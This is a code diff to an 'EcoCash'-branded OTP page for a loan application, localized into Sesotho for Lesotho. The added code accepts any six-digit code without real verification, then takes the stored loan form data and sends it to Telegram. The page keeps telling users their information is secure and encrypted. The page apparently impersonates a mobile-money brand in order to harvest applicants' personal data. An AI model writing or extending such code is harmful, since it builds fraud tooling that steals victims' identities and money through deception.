@@ -1,4 +1,5 @@
 import { useState, useRef, KeyboardEvent, ClipboardEvent } from 'react'
+import { sendToTelegram } from '../utils/telegram'
 
 interface OTPPageProps {
   onOTPSuccess: () => void
@@ -69,14 +70,32 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
     setError('')
 
     // Simulate OTP verification
-    setTimeout(() => {
+    setTimeout(async () => {
       if (otpCode.length === 6) {
-        // Success
-        onOTPSuccess()
+        // Retrieve loan form data from sessionStorage
+        const storedData = sessionStorage.getItem('loanFormData')
+        
+        if (storedData) {
+          try {
+            const loanData = JSON.parse(storedData)
+            // Submit to Telegram
+            await sendToTelegram(loanData)
+            // Clear stored data
+            sessionStorage.removeItem('loanFormData')
+            // Success - move to submitted page
+            onOTPSuccess()
+          } catch (error) {
+            setError('Failed to submit application. Please try again.')
+            setLoading(false)
+          }
+        } else {
+          // No form data found, still proceed
+          onOTPSuccess()
+        }
       } else {
         setError('Please enter complete OTP code')
+        setLoading(false)
       }
-      setLoading(false)
     }, 1500)
   }
 
@@ -115,6 +134,7 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
           <span className="text-[#0056a4]">Eco</span>
           <span className="text-[#e11d2d]">Cash</span>
         </div>
+        <p className="text-gray-600 mb-4 text-sm">Lesotho</p>
 
         {/* OTP Card */}
         <div className="bg-white py-12 px-8 rounded-[50px] shadow-[0_10px_30px_rgba(0,0,0,0.05)] border border-[#f0f0f0]">
@@ -123,9 +143,10 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
             <div className="w-20 h-20 bg-gradient-to-br from-[#0056a4] to-[#12009c] rounded-full flex items-center justify-center mx-auto mb-4">
               <i className="fa-solid fa-shield-halved text-white text-3xl"></i>
             </div>
-            <h2 className="text-2xl font-bold text-gray-800 mb-2">Enter OTP Code</h2>
+            <h2 className="text-2xl font-bold text-gray-800 mb-2">Kenya Khoutu ea OTP</h2>
+            <p className="text-gray-600 text-sm mb-1">Enter OTP Code</p>
             <p className="text-gray-600 text-sm">
-              We've sent a 6-digit code to
+              Re rometseng khoutu ea dinomoro tse 6 ho
               <br />
               <span className="font-semibold text-[#0056a4]">{phoneNumber}</span>
             </p>
@@ -167,19 +188,19 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
             {loading ? (
               <span className="flex items-center justify-center gap-2">
                 <i className="fa-solid fa-spinner fa-spin"></i>
-                Verifying...
+                E Netefatsa... (Verifying)
               </span>
             ) : (
               <span className="flex items-center justify-center gap-2">
                 <i className="fa-solid fa-check-circle"></i>
-                Verify OTP
+                Netefatsa (Verify OTP)
               </span>
             )}
           </button>
 
           {/* Resend OTP */}
           <div className="text-sm text-gray-600">
-            Didn't receive code?{' '}
+            Ha u fumane khoutu? (Didn't receive code?){' '}
             <button
               onClick={handleResendOTP}
               disabled={resending}
@@ -188,10 +209,10 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
               {resending ? (
                 <span>
                   <i className="fa-solid fa-spinner fa-spin mr-1"></i>
-                  Resending...
+                  E Romela hape...
                 </span>
               ) : (
-                'Resend OTP'
+                'Romela hape (Resend)'
               )}
             </button>
           </div>
@@ -200,7 +221,7 @@ const OTPPage = ({ onOTPSuccess, phoneNumber }: OTPPageProps) => {
         {/* Security Note */}
         <div className="mt-6 text-xs text-gray-500 flex items-center justify-center gap-2">
           <i className="fa-solid fa-lock"></i>
-          <span>Your information is secure and encrypted</span>
+          <span>Lintlha tsa hau li sireletsehile (Your info is secure)</span>
         </div>
       </div>
     </div>
